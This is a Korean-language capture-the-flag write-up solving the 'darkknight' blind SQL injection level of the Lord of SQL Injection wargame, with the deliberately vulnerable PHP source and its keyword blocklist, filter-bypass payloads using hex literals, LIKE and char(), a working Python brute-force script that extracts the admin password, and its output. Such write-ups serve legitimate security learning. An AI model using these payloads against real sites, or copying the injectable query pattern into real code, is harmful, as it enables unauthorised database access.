---
title: "[Lord of SQL Injection] LoS - darkknight 문제풀이"
date: 2018-07-31
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

아 뭔가 쓸데없이 오타도 많이내고, 뭔가 자잘한 삽질을 많이 한 문제이다.
잠을 제대로 못자서 그런건지 바보같은 삽질을 했다.
`darkknight` 라는 문제인데, 얘도 `Blind SQL Injection` 문제이다.  

<!--more-->

코드는 다음과 같다.  

```php
---------------------------------------------------------------------------------------------------
query : select id from prob_darkknight where id='guest' and pw='' and no=
---------------------------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```

이번엔 `ascii`도 사용을 못하고 `'`도 사용할 수 없다.
그럼 쿼리문에서 사용하는 `id = 'admin'`이라는 문자를 사용할 수 없다.
이 문제에 대해서는 금방 답을 찾았다.
바로 `hex` 값을 이용하는 것이다.
`id = 'admin'` 대신 `id = 0x61646d696e`를 입력해도 같은 결과를 얻을 수 있다.
그럼 `admin`의 `pw`의 길이를 구하는 쿼리는 아래와 같이 완성된다.  

```plain
?pw=1&no=0 or id like 0x61646d696e and length(pw) like 1
```

문제는 `pw`를 한 글자 씩 알아낼 때 이다.
`'`를 사용할 수 없으므로, `mid` 함수를 통해 `pw`를 한 글자 씩 뽑는다 하더라도 비교를 할 수가 없다.

처음에는 MySQL에 있는 `hex` 함수를 사용할까 했다.
여기서 삽질한게, `hex`는 `10진수를 16진수 값으로` 혹은 `16진수를 10진수 값으로` 바꾸어주는 함수인데, 나는 이걸 알고있었는데도 `16진수 값을 입력하면 비교가 되겠지!` 하고 생각했다.
추출되는 값은 `char` 형태의 문자기 때문에 당연히 비교할 수 없다.

그 다음에는 `char` 함수를 사용하는 것을 생각했다.
여기서 두번째 삽질을 했는데, `char` 함수의 인자는 `10진수 숫자`가 들어가야 한다.
근데 코드를 이 전에 풀었던 코드를 가져와 살짝만 수정해서 사용하다보니, 파이썬 코드에서 `chr(i)`를 쿼리의 `char` 함수의 인자로 넣어주고 있었다.  

문제가 안풀리길래 `도대체 왜지...` 이러다가 쿼리를 출력 해 보고서야 깨달았다.
쨌든 `pw`를 구하는 쿼리는 다음과 같은 형태가 된다.  

```plain
?pw=1&no=0 or id like 0x61646d696e and mid(pw, 1, 1) like char(48)
```

우여곡절 끝에 완성된 코드는 다음과 같다.  

```python
import requests

flag = ""
length = 0

url = "http://los.rubiya.kr/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 20):
	try:
		query = url + "1&no=0 or id like 0x61646d696e and length(pw) like " + str(i)
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue

	if 'Hello admin' in r.text:
		length = i
		break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = url + "1&no=0 or id like 0x61646d696e and mid(pw, " + str(j) + ", 1) like char(" + str(i) + ")"
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if 'Hello admin' in r.text:
			flag += chr(i)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

드디어 제대로 된 결과를 얻을 수 있었다.
쓸데없는 삽질 후에 얻은 값진 `admin`의 `pw`이다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  8
[+] Find password
[+] Found 1 : 0
[+] Found 2 : 0B
[+] Found 3 : 0B7
[+] Found 4 : 0B70
[+] Found 5 : 0B70E
[+] Found 6 : 0B70EA
[+] Found 7 : 0B70EA1
[+] Found 8 : 0B70EA1F
[+] Found password :  0B70EA1F
[+] End
```

알파벳 소문자로 바꿔서 아래와 같이 입력하면 문제가 풀린다.  

```plain
?pw=0b70ea1f
```

---

```php
--------------------------------------------------------------------------------------------------------------
query : select id from prob_darkknight where id='guest' and pw='0b70ea1f' and no=
--------------------------------------------------------------------------------------------------------------

DARKKNIGHT Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```

---

```plain
DARKKNIGHT Clear!!
```